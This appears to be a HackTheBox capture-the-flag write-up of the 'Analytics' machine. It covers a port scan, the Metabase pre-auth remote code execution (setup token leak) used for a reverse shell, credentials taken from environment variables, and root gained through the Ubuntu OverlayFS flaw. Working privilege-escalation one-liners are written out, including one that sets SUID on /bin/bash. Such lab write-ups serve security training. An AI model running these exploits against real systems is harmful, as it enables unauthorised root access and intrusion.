![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5f5ec707-ebe1-4abf-b001-8eb1d6d0b011)

https://app.hackthebox.com/machines/Analytics

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began by conducting a quick rustscan, which revealed only two open ports on the target host:

```bash
sudo rustscan -a 10.10.11.233 -- -sC -sV -vv -oN analytics_nmap
```
The scan results disclosed the following open ports and services:

```Rust
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Within the port scan results, I noticed a domain running on port 80: 'http://analytical.htb/'. I promptly added this domain to my host configuration file.

After adding the domain, I explored the website and discovered that it provides data analytics-related services:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/48108fa1-165f-4112-9ff0-2a9f3161a6f0)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Sub-domain & directory enumeration:

I checked the HTML source code of the website but didn't find any relevant information. So, I proceeded to perform sub-directory and VHost enumeration.

Unfortunately, scanning the VHost and sub-directories did not yield any helpful information for gaining initial access to the target machine.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9fa6b494-12b7-46c5-af4f-e306c7d6b90a)

I then decided to explore the login page, which redirected me to a new domain, "data.analytics.htb":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2288eecc-9110-4b2f-b395-f1f9c015670e)

I noticed that the application was running on MetaBase, so I began searching for any relevant exploits on the internet. After some time, I came across a [blog](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) that was published recently on July 22, 2023. The blog included a proof of concept (POC) and explained how to achieve remote code execution (RCE) on the target MetaBase application.

As per the blog, we can obtain the "setup-token" from the endpoint "/api/session/properties."

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0af42ad5-a270-4ae3-a9bb-90c5a6a4e284)

Upon checking the same endpoint on the target application, I found the setup token in plaintext:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b5656402-fb04-4d3a-9ae0-11c0b0b2b30b)

Using this setup token, we can authenticate ourselves on another endpoint, "/api/setup/validate," which ultimately provides us with RCE.

Please ensure that the image links and hyperlinks are accurate, and adjust them as necessary.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

Following the steps outlined in the blog, I launched my Burp Suite and crafted an HTTP request based on the provided proof of concept (POC). I used the setup token that I had extracted from the properties page.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8d0847d4-0933-401a-b486-8beacea7bd19)

The final request in Burp looked something like this:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/920b4084-845a-4873-b811-d991338bd291)

With my Netcat listener running, I sent the request from Burp and successfully gained a reverse shell as the user "metabase". (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c6799046-0de8-4342-a016-0fcfd24ee46d)

Upon inspecting the current environment, I discovered that I was operating within a Docker environment.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/fcdcdacc-2a63-4017-9e85-96dcd94f4b6e)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### User.txt:

To escape the Docker environment, I transferred the Linpeas binary to the target machine to check for potential vectors that might help me break out of Docker. Linpeas is a tool used for privilege escalation and enumeration.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/45ce5ff9-641e-452e-8b18-df721a12140c)

Linpeas revealed plaintext credentials belonging to the "metabase" user, stored in environment variables.

With these credentials, I used SSH to gain access to a stable environment. Additionally, I located the user flag in the Metabase home directory. 🙂

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0fdd9d92-6edc-4a8f-a100-64134e5433a5)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Root flag:

After obtaining the user flag, I attempted to gain access to the root flag by executing the Linpeas script. However, I didn't find anything particularly helpful through this method.

In my quest for privilege escalation, I conducted some research and received hints about an exploit related to the Ubuntu version being used.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2c5fd82b-5232-4cc8-a29d-fb89e16008b8)

It appears that the version is vulnerable to the [Ubuntu overlayfs vulnerability](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability). I discovered a proof of concept (POC) on [Reddit](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/), which I decided to follow.

I executed the POC and acquired the UID assigned as "root."

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);
os.system("id")'
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/baf904e4-93fa-4659-ac32-d5a6a5ebb2bf)

After confirming that the POC worked as intended, I made some minor modifications and changed the bash permissions to root bash.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0
);os.system("chmod u+s /bin/bash")'
```

Finally, I gained access to a root shell and obtained the root flag. (pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/608e3dfb-04a6-484a-b71e-b0f3e1858cee)

